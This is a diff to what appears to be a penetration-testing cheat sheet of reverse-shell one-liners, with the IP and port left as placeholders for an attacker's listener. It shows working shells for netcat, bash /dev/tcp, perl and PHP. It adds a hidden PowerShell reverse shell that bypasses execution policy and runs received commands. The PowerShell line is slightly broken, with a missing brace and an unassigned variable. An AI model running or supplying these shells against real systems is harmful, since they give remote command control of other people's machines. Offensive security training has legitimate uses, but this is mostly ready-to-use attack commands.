@@ -476,7 +476,8 @@ nc {IP ADDRESS} {PORT} –e /bin/bash
 
 # Without netcat installed
 
-# Usage - transfer payload via file transfer and execute binary
+# Usage - Windows
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{IP ADDRESS",{PORT});$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()
 
 # Usage - Linux
 bash -i >& /dev/tcp/{IP ADDRESS}/{PORT} 0>&1
@@ -486,6 +487,8 @@ perl -e ‘use Socket;$i=”{IP ADDRESS}″;$p={PORT};socket(S,PF_INET,SOCK_STRE
 
 # Usage - PHP
 php -r ‘$sock=fsockopen(“{IP ADDRESS}”,{PORT});exec(“/bin/sh -i <&3 >&3 2>&3”);’
+
+# Alternative - transfer payload via file transfer and execute binary
 
 # {IP ADDRESS}: IP Address of the client from step one (listener)
 # {PORT}: Port of the client from step one (listener)
